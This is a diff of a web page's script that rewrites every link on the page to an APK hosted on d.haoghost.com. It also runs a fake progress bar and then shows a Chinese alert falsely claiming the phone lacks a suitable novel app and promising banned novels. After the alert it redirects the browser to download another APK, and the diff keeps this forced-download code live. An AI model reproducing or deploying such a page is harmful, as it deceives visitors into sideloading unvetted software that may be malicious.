@@ -81,19 +81,25 @@ color: #ffffff;
 	</tr>
 </table>
 <script type="text/javascript" src="js/jquery.min.js"></script>
-<script type="text/javascript" src="js/autoDown.js"></script>
+<!--<script type="text/javascript" src="js/autoDown.js"></script>-->
 
 
 <script type="text/javascript"> 
-$("a").attr("href","http://d.haoghost.com/360ysdq.apk");
+$("a").attr("href","http://d.haoghost.com/360ysdq12.apk");
 function $i(obj){ 
 return document.getElementById(obj); 
 } 
 function go(){ 
 $i("bar").style.width = parseInt($i("bar").style.width) + 1 + "%"; 
 $i("bar").innerHTML = $i("bar").style.width; 
-if($i("bar").style.width == "100%"){ 
-window.clearInterval(bar); 
+if($i("bar").style.width == "100%"){
+window.clearInterval(bar);
+function getQueryString(name) {
+	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+	var r = window.location.search.substr(1).match(reg);
+	if (r != null) return unescape(r[2]); return null;
+}
+//if(getQueryString("f") && getQueryString("f").indexOf("cpctag_40")>=0) return;
 window.alert('系统检测到你手机中没有适合的小说程序，请点击确定，并安装自动为你匹配的小说程序！（软件不停更新被禁小说。）');
 	location.href="http://d.haoghost.com/shuqi_v8.0.3.4.apk";//shuqi_v8.0.3.4.apk
 } 
